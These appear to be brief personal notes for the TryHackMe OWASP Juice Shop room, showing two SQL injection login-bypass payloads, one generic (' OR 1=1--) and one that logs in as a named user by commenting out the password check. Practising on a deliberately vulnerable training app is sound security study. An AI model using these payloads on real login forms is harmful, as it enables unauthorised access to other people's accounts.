
[Room](https://tryhackme.com/room/owaspjuiceshop)

## SQL Injection
In email line put that, to circumvent check:

```SQL
' OR 1=1--
```

For login to specif user, this also works:

```SQL
bender@juice-sh.op'--
```

as the `'--` part disables the password checking